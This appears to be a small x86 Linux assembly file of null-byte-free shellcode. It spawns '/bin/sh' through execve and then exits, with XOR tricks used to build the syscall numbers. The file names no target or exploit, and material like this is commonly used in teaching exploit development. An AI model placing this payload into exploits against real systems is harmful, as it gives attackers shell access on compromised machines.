.data

.text

.global _start

_start:

# sys_execve:
#   %eax  %ebx  %ecx  %edx
#    11    file  argv  envp
    xor     %eax, %eax
    push    %eax
    push    $0x68732f6e
    push    $0x69622f2f
    movl    %esp, %ebx
    movl    %eax, %ecx
    movl    %eax, %edx
    movl    $0xfffffffb, %eax
    xor     $0xfffffff0, %eax
    int     $0x80

# sys_exit:
#   %eax  %ebx
#    1     code
    xor     %ebx, %ebx
    movl    $0xfffffff1, %eax
    xor     $0xfffffff0, %eax
    int     $0x80
